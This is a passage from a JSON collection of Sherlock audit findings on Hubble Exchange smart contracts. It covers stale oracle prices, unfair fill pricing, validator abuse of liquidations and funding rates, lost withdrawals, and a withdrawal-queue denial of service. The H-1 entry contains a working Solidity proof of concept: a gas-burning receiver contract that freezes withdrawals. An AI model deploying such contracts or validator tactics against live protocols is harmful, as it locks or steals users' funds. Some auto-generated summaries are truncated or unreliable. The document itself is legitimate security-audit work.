[Oracle.getUnderlyingPrice()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L24C14-L24C32) is used by the next contracts:\n\n- [InsuranceFund](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol)\n- [MarginAccount](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccount.sol)\n- [AMM](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol)\n\n## Tool used\n\nManual review\n\n## Recommendation\n\nRead the [updatedAt](https://docs.chain.link/data-feeds/api-reference#latestrounddata) return value from the `Chainlink.latestRoundData()` function and verify that is not older than than specific time tolerance.\n\n```solidity\nrequire(block.timestamp - udpatedData < toleranceTime, \"stale price\");\n```\n\n\n\n## Discussion\n\n**asquare08**\n\nwill add a tolerance time equal to the max update time of the price feed.",
      "summary": "\nThis bug report is about an issue found with the `Chainlink.latestRoundData()` function, which may return stale results. The function is used in the InsuranceFund, MarginAccount, and AMM contracts, and the problem is that there is no check for stale data. This could be catastrophic for the project, as the token prices are used in many contracts.\n\nThe bug was found by 0x3e84fa45, 0xbepresent, 0xmuxyz, 0xpinky, 0xvj, Bauer, Breeje, BugBusters, BugHunter101, Hama, Kaiziron, MohammedRizwan, PRAISE, Vagner, carrotsmuggler, crimson-rat-reach, darkart, dimulski, dirk_y, kutugu, lemonmon, lil.eth, minhtrng, osmanozdemir1, p-tsanev, rogue-lion-0619, shtesesamoubiq, and tsvetanovv. It was identified using manual review.\n\nThe recommendation is to read the updatedAt return value from the `Chainlink.latestRoundData()` function and verify that it is not older than a specific time tolerance. This can be done by adding the following code to the project:\n\n```solidity\nrequire(block.timestamp - udpatedData < toleranceTime, \"stale price\");\n```\n\nThe discussion has suggested that a tolerance time equal to the max update time of the price feed should be added.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/18",
      "tags": [
        "Stale Price",
        "Chainlink"
      ],
      "finders": [
        "0xvj",
        "tsvetanovv",
        "lil.eth",
        "Breeje",
        "minhtrng",
        "carrotsmuggler",
        "lemonmon",
        "PRAISE",
        "MohammedRizwan",
        "Kaiziron",
        "0xmuxyz",
        "Vagner",
        "BugBusters",
        "Bauer",
        "BugHunter101",
        "0xbepresent",
        "0xpinky",
        "Hama",
        "p-tsanev",
        "osmanozdemir1",
        "shtesesamoubiq",
        "rogue-lion-0619",
        "dimulski",
        "kutugu",
        "0x3e84fa45",
        "darkart",
        "crimson-rat-reach",
        "dirk\\_y"
      ]
    },
    {
      "id": "20686",
      "title": "M-1: Risk of Unfair Order Execution Price in `_validateOrdersAndDetermineFillPrice` Function",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/8 \n\n## Found by \nmoneyversed\n## Summary\n\nWhile the system seems to have appropriate checks in place for order matching, a potential risk exists around the order execution pricing logic, specifically when the orders are placed in the same block. In such cases, the system currently selects the sell order price as the fill price. This may not be fair for the buyer, who may end up paying more than necessary.\n\n## Vulnerability Detail\n\nIn the `_validateOrdersAndDetermineFillPrice` function, when two orders are placed in the same block, the fill price is set as the price of the sell order (orders[1]). This is potentially unfair because it could lead to a scenario where the buyer is paying the maximum possible price, even when the sell order was potentially willing to sell at a lower price. \n\n## Impact\n\nThis could affect the trust of participants in the exchange, particularly those who frequently make buy orders. The unfair pricing might result in monetary losses for these participants, leading to a negative perception of the platform.\n\n## Code Snippet\n\n```solidity\n        if (blockPlaced0 < blockPlaced1) {\n            mode0 = OrderExecutionMode.Maker;\n            fillPrice = orders[0].price;\n        } else if (blockPlaced0 > blockPlaced1) {\n            mode1 = OrderExecutionMode.Maker;\n            fillPrice = orders[1].price;\n        } else { // both orders are placed in the same block, not possible to determine what came first in solidity\n            // executing both orders as taker order\n            mode0 = OrderExecutionMode.SameBlock;\n            mode1 = OrderExecutionMode.SameBlock;\n            // Bulls (Longs) are our friends. We give them a favorable price in this corner case\n            fillPrice = orders[1].price;\n        }\n```\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L288-L300\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nA more fair approach might be to calculate the average of the buy order and sell order prices, which might better reflect the market conditions at the moment both orders were made. In case of any restrictions for using the average price, a price setting rule that better approximates a fair market price should be used.\n\n## Proof Of Concept\n\nTo reproduce this vulnerability:\n\n1. Deploy the smart contract on a local testnet or Ethereum mainnet fork.\n2. Place two orders: a buy order and a sell order within the same block with different prices.\n3. Once the orders are matched and executed, check the execution price.\n4. You will notice that the execution price is exactly the same as the sell order, regardless of the buy order's price.\n\nNote: This is a potential risk, meaning that it depends on the intentions of the traders when they place their orders. Traders who are willing to trade at the execution price would not consider this a problem, while others might see it as an unfair pricing practice.\n\n\n\n## Discussion\n\n**asquare08**\n\nIn the case of same block trade, shorts are selling at the price they quoted and longs are buying at price  long order price. As it is a limit order system, the user get to decide the price of the order and  they are always getting a better or the same price than what they quoted. There is no scenario where a user is getting unfair/worst price.\n\n**ctf-sec**\n\nAlthough the issue has sponsor dispute tag, I am more incline with the watson and leave this as a medium issue\n\nBecause\n\n> When a validator is selected as the block producer, the buildBlock function fetches active markets and open orders from the indexer, evaluates open positions for potential liquidations, runs the matching engine, and then relays these operations as local transactions before continuing the normal transaction bundling process.\n\nthe block producer may determine the order matching and manipulate who is order[0] and who is order[1] to extract value\n\n```solidity\n{ // both orders are placed in the same block, not possible to determine what came first in solidity\n            // executing both orders as taker order\n            mode0 = OrderExecutionMode.SameBlock;\n            mode1 = OrderExecutionMode.SameBlock;\n            // Bulls (Longs) are our friends. We give them a favorable price in this corner case\n            fillPrice = orders[1].price;\n        }\n```\n\nWant to quote the first second in the report: \n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183\n\n> Validators are given the exclusive privilege to match.\n\n**asquare08**\n\nYes correct validator can extract MEV from this by opening longs at better price everytime. Changed status to confirmed. \nFYI: Fill price determination happens through precompile now and long order is executed as taker and short as maker (maker fee is less than taker fee). So long will get better price but pay more fee and short order will execute at order price but pay less fee",
      "summary": "\nThis bug report is about a potential risk in the `_validateOrdersAndDetermineFillPrice` function of the Hubble Exchange smart contract, which could lead to unfair pricing for buyers. This could happen when two orders are placed in the same block, where the fill price is set as the price of the sell order (orders[1]). This could potentially result in buyers paying more than necessary, leading to monetary losses and a negative perception of the platform.\n\nA more fair approach would be to calculate the average of the buy order and sell order prices, which would better reflect the market conditions at the moment both orders were made. Alternatively, a price setting rule that better approximates a fair market price should be used.\n\nThe bug can be reproduced by deploying the smart contract on a local testnet or Ethereum mainnet fork, placing two orders within the same block with different prices, and then checking the execution price. It should be noted that this is a potential risk, as it depends on the intentions of the traders when they place their orders. \n\nThe validator may also be able to extract MEV by opening longs at a better price everytime. The fill price determination now happens through a precompile, so the long order is executed as a taker and the short order as a maker (with a lower fee). This means that the long order will get a better price, but will pay more in fees, while the short order will execute at the order price but pay less in fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/8",
      "tags": [],
      "finders": [
        "moneyversed"
      ]
    },
    {
      "id": "20685",
      "title": "H-3: Rogue validators can manipulate funding rates and profit unfairly from liquidations",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183 \n\n## Found by \n0x52\n## Summary\n\nValidators are given the exclusive privilege to match. Any validator can abuse this privilege to manipulate funding rates and profit unfairly from liquidations. Normally validators are fully trusted but in the circumstances of these smart contracts and the chain it's deployed on, practically anyone can become a validator and abuse this privilege.\n\n## Vulnerability Detail\n\nConsider the following attack vectors:\n\n1) Profiting unfairly from liquidation. Assume the current mark price for WETH is 2000. A user is liquidated and 100 ETH needs to be sold. Assume there are available orders that can match this liquidation at 2000. Instead of matching it directly, the validator can create his own order at 1980 and match the liquidation to his own order. He can then immediately sell and match with the other available orders for a profit of 2,000 (20 * 100) USDC.\n\n2) Manipulation of funding rate. Validators are allowed to match non-liquidation orders at up to 20% spread from the oracle. This makes it incredibly easy for validators to manipulate the markPriceTwap. By creating and matching tiny orders at the extremes of this spread they can dramatically skew the funding rate it whatever way they please. Max funding rates can liquidate leveraged positions very quickly allowing that validator to further profit from their liquidations.\n\nNow we can discuss how just about anyone can become a validator and abuse this privilege with zero consequences.\n\nFirst we need to consider the typical methodology for ensuring validators behave and why NONE of those factors apply in this scenario. 1) \"Slash validators that misbehave.\" Hubble mainnet is a fork of the AVAX C-Chain which is different from most chains in the fact that **[AVAX validators can't be slashed](https://docs.cloud.coinbase.com/delegation/docs/avalanche-faq#what-are-the-risks-associated-with-delegating)**. 2) \"Validators are forced to hold a volatile protocol token that would depreciate if they are publicly observed misbehaving.\" On Hubble mainnet the gas token is USDC so it would not depreciate in the event that validators misbehave. 3) \"Blocks that break consensus rules are rejected.\" The Hubble exchange smart contracts are not part of the consensus layer so abusing validator privilege as described aren't breaking any consensus rules and would therefore be accepted by honest validators.\n\nSecond we consider the ease of becoming a validator. Hubble mainnet is a fork of AVAX and uses it's same consensus mechanism. This allows any node who posts the required stake to become a validator for the network. This allows anyone with access to any decent level of capital to become a validator and begin exploiting users. \n\n## Impact\n\nValidators can manipulate funding rates and profit unfairly from liquidations\n\n## Code Snippet\n\n[OrderBook.sol#L215-L258](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L215-L258)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe methodology of order matching needs to be rethought to force validators to match fairly and efficiently \n\n\n\n## Discussion\n\n**asquare08**\n\nWe will fix this with post-mainnet releases. Initially, we are launching with a trusted, closed set of validators and will fix this before we open for public validators. \nRemarks about point 2. Manipulation of funding rate - for this to happen, a validator will need to place and execute orders for a fairly large amount of time if there are other trades in the system. So this scenario can happen in case of low liquidity in the system. \n\n**P12473**\n\nEscalate\n\nThis should not be a high because validators in hubble are [decided by the governance](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L533-L535) which is different from the validators who secure the hubble network.\n\nFor this exploit to occur, an existing validator needs to be compromised or a rogue validator added by manipulating the governance vote. Moreover, this attack assumes that there is only 1 validator when there can be multiple non rogue validators matching orders as well.\n\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This should not be a high because validators in hubble are [decided by the governance](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L533-L535) which is different from the validators who secure the hubble network.\n> \n> For this exploit to occur, an existing validator needs to be compromised or a rogue validator added by manipulating the governance vote. Moreover, this attack assumes that there is only 1 validator when there can be multiple non rogue validators matching orders as well.\n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**djb15**\n\nI agree with this escalation. Regarding the manipulation of the funding rate see https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/100#issuecomment-1640389572 which is acknowledged as a low severity issue because you just need 1 non-malicious validator. I believe the same is true for this report where one non malicious validator would prevent the funding rate being manipulated over a significant period of time (in normal market conditions).\n\nEDIT: See https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/87#issuecomment-1644045278 for some related justification \n\n**ctf-sec**\n\nIn the part funding manipulation yes\n\nbut the attacker vector does not require all validator to be malicious, one malicious validator can do this and extract value from user.\n\n> Profiting unfairly from liquidation. Assume the current mark price for WETH is 2000. A user is liquidated and 100 ETH needs to be sold. Assume there are available orders that can match this liquidation at 2000. Instead of matching it directly, the validator can create his own order at 1980 and match the liquidation to his own order. He can then immediately sell and match with the other available orders for a profit of 2,000 (20 * 100) USDC.\n\nRecommend maintaining high severity\n\n**djb15**\n\nThat's a fair point, I've found the following quote from the sponsor in the discord channel (https://discord.com/channels/812037309376495636/1121092175216787507/1126818439646957628):\n\n> So, in that sense and from the perspective of the smart contract audit, validators are not trusted.\n\nSo I agree the \"profit unfairly from liquidations\" part of this report is probably a valid high as I agree you only need 1 malicious validator. But the \"manipulating funding rates part\" is probably a medium as you would need either lots of malicious validators in normal market conditions or 1 malicious validator in low liquidity market conditions. So high overall :D\n\n**IAm0x52**\n\nThe validators aren't different, they are the same. The concept that governance would restrict validators to a trusted set is new information that was never present in any of the docs or readme during the contest. All information indicated that validators would be open and decentralized. Based on that information anyone could be a validator which is why I think this should remain as a high risk issue.\n\n#87 should not be a dupe of this issue. Realistically I shouldn't have submitted this as a single issue and should have submitted it as two. One for liquidation manipulation and the other for the funding rate manipulation. Since a single issue can't be a dupe of two different issues, this should remain a separate issue.\n\n**P12473**\n\n> The validators aren't different, they are the same.\n\nIf they are the same and any validators of the network can participate in matching orders, then why was this information not communicated to us on the docs or the README?\n\nCan you please show me an example of a smart contract on AVAX C-Chain with a protected \"validator\" role in the smart contract and yet any of the validators of AVAX consensus layer can pass that check.\n\nMore generally, should vulnerabilities regarding information that was not communicated to us be also considered valid? This encompasses literally everything, and you start to go into the world of crazy hypothetical what-ifs. @hrishibhat \n\n> All information indicated that validators would be open and decentralized. \n\nThe README clearly states that there is a governance role which is a TRUSTED role. All actions of a trusted role should be trusted hence one would assume that who the governance selects as validators are to be trusted.\n\nIf this premise is wrong, then one can go so far as to generalise that all privileged roles cannot be trusted because there is a non-zero chance that they will go rogue / fall in the hands of the wrong people.\n\n> Realistically I shouldn't have submitted this as a single issue and should have submitted it as two. One for liquidation manipulation and the other for the funding rate manipulation.\n\nBoth liquidation manipulation and funding rate manipulation is predicated on the assumption that rogue validators [were selected to match orders by the governance](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L533-L535).\n\nLiquidation manipulation also assumes that: \n\n1. there are no other honest validators to match this user.\n2. the rogue validator of the smart contract also controls a substantial AVAX stake as a node at the consensus layer in order to ensure that his orders are finalized.\n\nAs described by the sponsor, funding rate manipulation can only occur when there is low liquidity. When there is high liquidity, manipulating the TWAP price will be too expensive just to extract funding from users. In many past contests, a comment like this by the sponsor would immediately invalidate the report.\n\nIt is also by design that if the system has low liquidity, the funding paid by the user will be high. The onus should be on the user to close his position.\n\n> Since a single issue can't be a dupe of two different issues, this should remain a separate issue.\n\nLol I'm gonna start grouping all my issues together too because multiple issues cant be a dup of a single issue.  \n\n\n**IAm0x52**\n\n> If they are the same and any validators of the network can participate in matching orders, then why was this information not communicated to us on the docs or the README\n\nAll network validators have to be added by governance or else there would be a lot of empty blocks because the unverified block producers wouldn't be able to match any orders. Fundamentally they have to be the same.\n\n> there are no other honest validators to match this user.\n\nThis statement is incorrect. When it is this validator's turn to produce the block they will be able to abuse this.\n\n> the rogue validator of the smart contract also controls a substantial AVAX stake as a node at the consensus layer in order to ensure that his orders are finalized.\n\nAlso incorrect. If you would read my issue, abusing liquidations in this way doesn't break any consensus rules and therefore would be accepted by honest validators.\n\n> Both liquidation manipulation and funding rate manipulation is predicated on the assumption that rogue validators [were selected to match orders by the governance](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/orderbooks/OrderBook.sol#L533-L535).\n\nIncorrect again. Anyone, not just validators, can manipulate funding rate as demonstrated by #87. Hence why this is two separate issues.\n\n> Lol I'm gonna start grouping all my issues together too because multiple issues cant be a dup of a single issue. \n\nYet another incorrect statement. In this scenario I receive less of the prize pool not more.\n\n**hrishibhat**\n\n@P12473 I think the above [response](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1661280730) makes sense. \ndo you have further comments?\n\n**P12473**\n\n> @P12473 I think the above [response](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1661280730) makes sense. do you have further comments?\n\nThanks for giving me this opportunity to speak but I do not have any comments.\n\n@IAm0x52 is a much better auditor than I am and it is most likely that I am wrong. I want to understand his perspective but I am unable to do so from his explanation. If you agree with his take then I will rest my case.\n\nI only hope that the decision was an impartial one. Thanks again!\n\n**asquare08**\n\nFor the scope of this audit, validators should not be trusted. However, we'll launch on mainnet with a closed set of trusted validators and plan to open for public validators later.\nSo, point 1 (liquidation) is a valid high issue as it can happen even if 1 validator is malicious and point 2 (funding payment) is a valid medium issue as it can happen only in low liquidity case and will also be costly to do so.\n\n**hrishibhat**\n\nResult:\nHigh\nUnique\nConsidering this issue a valid high based on the discussion above and Sponsor's [comment](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1665745210)\n\nAdditionally, the [readme](https://github.com/sherlock-audit/2023-04-hubble-exchange#q-are-there-any-additional-protocol-roles-if-yes-please-explain-in-detail) shared information about the trusted protocol roles were limited to the governance. \nAnd the docs provided context on the validators and their functioning:\nhttps://medium.com/hubbleexchange/introducing-hubble-exchange-a-purpose-built-chain-for-perps-25c60db66d44\nhttps://hubbleexchange.notion.site/Hubble-Exchange-Overview-e9487ec19fe9451c9d445be15978c740\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [p12473](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183/#issuecomment-1642958328): rejected",
      "summary": "\nThis bug report is about validators being able to manipulate funding rates and profit unfairly from liquidations on the Hubble Exchange. Validators are given the exclusive privilege to match orders and any validator can abuse this privilege to manipulate funding rates and take advantage of liquidations. Normally validators are fully trusted but in this case, anyone can become a validator and take advantage of this privilege. \n\nThe main attack vector is profiting unfairly from liquidations. For example, a user is liquidated and 100 ETH needs to be sold. Assume there are available orders that can match this liquidation at 2000. Instead of matching it directly, the validator can create his own order at 1980 and match the liquidation to his own order. He can then immediately sell and match with the other available orders for a profit of 2,000 (20 * 100) USDC.\n\nThe second attack vector is manipulating the funding rate. Validators are allowed to match non-liquidation orders at up to 20% spread from the oracle. This makes it incredibly easy for validators to manipulate the markPriceTwap. By creating and matching tiny orders at the extremes of this spread they can dramatically skew the funding rate it whatever way they please. Max funding rates can liquidate leveraged positions very quickly allowing that validator to further profit from their liquidations.\n\nThe impact of this bug is that validators can manipulate funding rates and profit unfairly from liquidations. The code snippet is from the OrderBook.sol#L215-L258. Manual review was used for this bug.\n\nThe recommendation is to rethink the methodology of order matching to force validators to match fairly and efficiently. Initially, the project is launching with a trusted, closed set of validators and will fix this before opening for public validators.\n\nThe discussion revolved around the trust of validators, the ease of becoming a validator, the liquidation manipulation, the funding rate manipulation, the trust of the governance role, the low liquidity of the system, and the grouping of the issue. It was concluded that the liquidation manipulation is a valid high issue as it can happen even if 1 validator is malicious and the funding rate manipulation is a valid medium issue as it can happen only in low liquidity case and will also be costly to do so. \n\nThe escalation was resolved successfully and the issue was considered valid and a high. The readme and docs provided information about",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20684",
      "title": "H-2: Failed withdrawals from VUSD#processWithdrawals will be lost forever",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/162 \n\n## Found by \n0x52, 0xDjango, 0xpinky, Delvir0, Kaiziron, dirk\\_y, kutugu, n1punp, ver0759, yy\n## Summary\n\nWhen withdrawals fail inside VUSD#processWithdrawals they are permanently passed over and cannot be retried. The result is that any failed withdrawal will be lost forever.\n\n## Vulnerability Detail\n\n[VUSD.sol#L75-L81](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L75-L81)\n\n            (bool success, bytes memory data) = withdrawal.usr.call{value: withdrawal.amount}(\"\");\n            if (success) {\n                reserve -= withdrawal.amount;\n            } else {\n                emit WithdrawalFailed(withdrawal.usr, withdrawal.amount, data);\n            }\n            i += 1;\n\nIf the call to withdrawal.usr fails the contract will simply emit an event and continue on with its cycle. Since there is no way to retry withdrawals, these funds will be permanently lost.\n\n## Impact\n\nWithdrawals that fail will be permanently locked\n\n## Code Snippet\n\n[VUSD.sol#L65-L85](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L65-L85)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCache failed withdrawals and allow them to be retried or simply send VUSD to the user if it fails.\n\n\n\n## Discussion\n\n**asquare08**\n\nwill add functionality to retry withdrawals",
      "summary": "\nThis bug report is about the issue of failed withdrawals from VUSD#processWithdrawals, which will be lost forever. This was found by 0x52, 0xDjango, 0xpinky, Delvir0, Kaiziron, dirk\\_y, kutugu, n1punp, ver0759, and yy. The code snippet in VUSD.sol#L75-L81 shows that if the call to withdrawal.usr fails, the contract will simply emit an event and continue on with its cycle, meaning that any failed withdrawals will be permanently lost. This has the impact of permanently locking withdrawals that fail. The tool used to find this bug was manual review. The recommendation is to either cache failed withdrawals and allow them to be retried, or to simply send VUSD to the user if it fails. Finally, asquare08 suggested adding functionality to retry withdrawals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/162",
      "tags": [],
      "finders": [
        "0x52",
        "kutugu",
        "0xDjango",
        "ver0759",
        "Kaiziron",
        "0xpinky",
        "dirk\\_y",
        "Delvir0",
        "yy",
        "n1punp"
      ]
    },
    {
      "id": "20683",
      "title": "H-1: ProcessWithdrawals is still DOS-able",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116 \n\n## Found by \n0x3e84fa45, 0x52, 0xDjango, 0xbepresent, carrotsmuggler, dirk\\_y, kutugu, p12473, qbs, qckhp, rogue-lion-0619\n## Summary\n\n[DOS on process withdrawals](https://github.com/code-423n4/2022-02-hubble-findings/issues/119) were reported in the previous code4rena audit however the fix does not actually stop DOS, it only makes it more expensive. There is a much cheaper way to DOS the withdrawal queue - that is by specifying the `usr` to be a smart contract that consumes all the gas. \n\n## Vulnerability Detail\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.9;\nimport \"./Utils.sol\";\n\ncontract MaliciousReceiver {\n    uint256 public gas;\n    receive() payable external {\n        gas = gasleft();\n        for(uint256 i = 0; i < 150000; i++) {} // 140k iteration uses about 28m gas. 150k uses slightly over 30m.\n    }\n}\n\ncontract VUSDWithReceiveTest is Utils {\n    event WithdrawalFailed(address indexed trader, uint amount, bytes data);\n\n    function setUp() public {\n        setupContracts();\n    }\n\n    function test_CannotProcessWithdrawals(uint128 amount) public {\n        MaliciousReceiver r = new MaliciousReceiver();\n\n        vm.assume(amount >= 5e6);\n        // mint vusd for this contract\n        mintVusd(address(this), amount);\n        // alice and bob also mint vusd\n        mintVusd(alice, amount);\n        mintVusd(bob, amount);\n\n        // withdraw husd\n        husd.withdraw(amount);      // first withdraw in the array\n        vm.prank(alice);\n        husd.withdraw(amount);\n        vm.prank(bob);              // Bob is the malicious user and he wants to withdraw the VUSD to his smart contract\n        husd.withdrawTo(address(r), amount);\n\n        assertEq(husd.withdrawalQLength(), 3);\n        assertEq(husd.start(), 0);\n\n        husd.processWithdrawals();  // This doesn't fail on foundry because foundry's gas limit is way higher than ethereum's. \n\n        uint256 ethereumSoftGasLimit = 30_000_000;\n        assertGt(r.gas(), ethereumSoftGasLimit); // You can only transfer at most 63/64 gas to an external call and the fact that the recorded amt of gas is > 30m shows that processWithdrawals will always revert when called on mainnet. \n    }\n\n    receive() payable external {\n        assertEq(msg.sender, address(husd));\n    }\n}\n```\n\nCopy and paste this file into the test/foundry folder and run it.\n\nThe test **will not fail** because foundry has a [very high gas limit](https://book.getfoundry.sh/reference/config/testing?#gas_limit) but you can see from the test that the amount of gas that was recorded in the malicious contract is higher than 30m (which is the [current gas limit on ethereum](https://ethereum.org/en/developers/docs/gas/#:~:text=Block%20size,-Before%20the%20London&text=The%20London%20Upgrade%20introduced%20variable,2x%20the%20target%20block%20size)). If you ran the test by specifying the gas-limit i.e. `forge test -vvv --match-path test/foundry/VUSDRevert.t.sol --gas-limit 30000000` The test will fail with `Reason: EvmError: OutOfGas` because there is not enough gas to transfer to the malicious contract to run 150k iterations.\n\n## Impact\n\nUsers will lose their funds and have their VUSD burnt forever because nobody is able to process any withdrawals.\n\n## Code Snippet\n\nhttps://github.com/hubble-exchange/hubble-protocol/blob/d89714101dd3494b132a3e3f9fed9aca4e19aef6/contracts/VUSD.sol#L65-L85\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFrom best recommendation to worst\n\n1. Remove the queue and withdraw the assets immediately when `withdraw` is called.\n2. Allow users to process withdrawals by specifying the index index\n3. Allow the admin to remove these bad withdrawals from the queue\n4. Allow the admin to adjust the start position to skip these bad withdrawals.\n\n\n\n\n## Discussion\n\n**P12473**\n\nEscalate\n\nI think we should differentiate between a temporary DOS like #153 vs a permanent DOS like my issue (and a few others that are marked as dups of #153 e.g. #57) and the fix suggested by #153 does not fix our vulnerability.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> I think we should differentiate between a temporary DOS like #153 vs a permanent DOS like my issue (and a few others that are marked as dups of #153 e.g. #57) and the fix suggested by #153 does not fix our vulnerability.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nPlease check:\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153#issuecomment-1643620806\n\n**P12473**\n\n> Please check:\n> \n> [#153 (comment)](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153#issuecomment-1643620806)\n\nThe lack of reentrancy guards does not prevent the attack vector mentioned here. I see 3 broad categorization of issues that can DOS the processWithdraw function. \n\n| Vulnerability | Issues | Effect |\n| -- | -- | -- |\n| Consuming more than the max allowed gas limit of the network | #116, #57, #138, #160, #191, #215, #158* | permanent DOS, single call |\n| Cross functional reentrancy | #153, #195 | temporary DOS, single call |\n| Spamming the withdrawal queue | everything else | temporary DOS, multiple call |\n\nPlease note that this issue (and all its dups) will break the `processWithdrawal` function entirely and forever. You cannot undo it because there is no way to process a withdrawal transaction that consumes more gas than is maximally allowed in a single block e.g. 30m on ethereum, 15m on avalanche.\n\n\\* I have also grouped #158 together because it is effectively the same thing i.e. the miners cannot process the withdrawal because it consumes too much gas (either from loading too much memory or from trying to execute a million iterations of a loop).\n\n**ctf-sec**\n\nThis issues just outline an different way to waste gas in external call\n\nRecommend maintaining the original duplication because the issue are grouped by root cause, not by fix or impact\n\n**hrishibhat**\n\nResult:\nHigh\nHas duplicates\nWhile I agree given the nature of the issues around external `.call` and out-of-gas-related issues in the `processWithdrawals` function, there could have been multiple versions of duplications. \nTend to agree with the analysis made in this comment [here](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116#issuecomment-1643976730).\nAfter looking at all the issues and considering the attack vectors mentioned, based on the [Sherlock rules](https://docs.sherlock.xyz/audits/judging/judging#duplication-rules) this is the version of duplication that was concluded:\n- 1. Issues that result in a user being a malicious contract that consumes all gas during `processWithdrawals`\n#116,#57,#138,#160,#191,#215,#158, #122, #96, #95, #127, #198\n- 2. Griefing due to cross-functional reentrancy \n#153, #195\n- 3. DOS due to large withdrawal requests\n#81, #94, #15\n\nNote:\nI agree that there may be other duplication sets based on the interpretations of the duplication rules, but this is the one I decided to go with and consider fair. \n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [p12473](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116/#issuecomment-1643012093): accepted",
      "summary": "\nA bug report has been filed for the Hubble Exchange protocol, which states that the ProcessWithdrawals function is still DOS-able. This bug was found by 0x3e84fa45, 0x52, 0xDjango, 0xbepresent, carrotsmuggler, dirk\\_y, kutugu, p12473, qbs, qckhp, rogue-lion-0619 and reported in the previous code4rena audit. The bug is related to a malicious user specifying the `usr` to be a smart contract that consumes all the gas, which would cause a DOS on the withdrawal queue. This would lead to users losing their funds and having their VUSD burnt forever, as nobody would be able to process any withdrawals.\n\nThe code snippet related to this bug can be found at https://github.com/hubble-exchange/hubble-protocol/blob/d89714101dd3494b132a3e3f9fed9aca4e19aef6/contracts/VUSD.sol#L65-L85. The tool used for finding this bug was Manual Review.\n\nThe recommended solutions to this bug are, from best to worst: \n1. Remove the queue and withdraw the assets immediately when `withdraw` is called.\n2. Allow users to process withdrawals by specifying the index index\n3. Allow the admin to remove these bad withdrawals from the queue\n4. Allow the admin to adjust the start position to skip these bad withdrawals.\n\nThe bug was escalated by p12473, who suggested that the fix suggested by #153 does not fix the vulnerability and that the issues should be differentiated between a temporary DOS and a permanent DOS. This was accepted by sherlock-admin2, who also suggested maintaining the original duplication based on the root cause and not the fix or impact. Finally, hrishibhat concluded that the issues should be grouped into three categories: consuming more than the max allowed gas limit of the network, cross functional reentrancy and spamming the withdrawal queue. \n\nOverall, this bug report outlines a way to waste gas in external calls and provides a few solutions to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
